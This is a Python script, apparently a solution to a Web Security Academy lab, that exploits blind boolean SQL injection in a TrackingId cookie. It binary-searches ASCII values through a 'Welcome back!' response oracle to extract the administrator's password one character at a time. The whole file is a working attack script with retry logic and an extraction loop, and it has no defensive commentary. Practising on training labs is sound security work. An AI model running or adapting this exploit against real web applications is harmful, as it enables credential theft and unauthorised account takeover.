import time

import requests

lab_url = "https://0af4009b04538391821a331f00db00b2.web-security-academy.net/"

ASCII_MIN = 32
ASCII_MAX = 126
MAX_POSITIONS = 64
MAX_RETRIES = 3


def oracle(condition, retries=MAX_RETRIES):
    """Return True if the SQL condition is true, based on the response oracle."""
    payload = (
        "' OR (SELECT COUNT(*) FROM users "
        f"WHERE username='administrator' AND {condition}) > 0--"
    )

    for attempt in range(1, retries + 1):
        try:
            response = requests.get(
                lab_url, cookies={"TrackingId": payload}, timeout=10
            )
            return "Welcome back!" in response.text
        except requests.RequestException as exc:
            if attempt == retries:
                raise
            print(f"Request failed ({exc}); retrying ({attempt}/{retries})...")
            time.sleep(attempt)

    return False


def find_char(position):
    """Binary search the ASCII value at `position`.

    Returns None when the position is past the end of the password.
    """
    expr = f"ASCII(SUBSTRING(password, {position}, 1))"

    # Past the end of the password, SUBSTRING returns '' and ASCII('') is NULL,
    # so this comparison is never true. That means the password ended.
    if not oracle(f"{expr} >= {ASCII_MIN}"):
        return None

    lo, hi = ASCII_MIN, ASCII_MAX
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"{expr} > {mid}"):
            lo = mid + 1
        else:
            hi = mid

    # Guard against a character outside the searchable range.
    if not oracle(f"{expr} = {lo}"):
        return None

    return chr(lo)

def main():
    result = ""

    for position in range(1, MAX_POSITIONS + 1):
        char = find_char(position)
        if char is None:
            print(f"Password ended at position {position}. Stopping.")
            break

        result += char
        print(f"Position {position}: {char}")

    print("Result:", result)


if __name__ == "__main__":
    main()
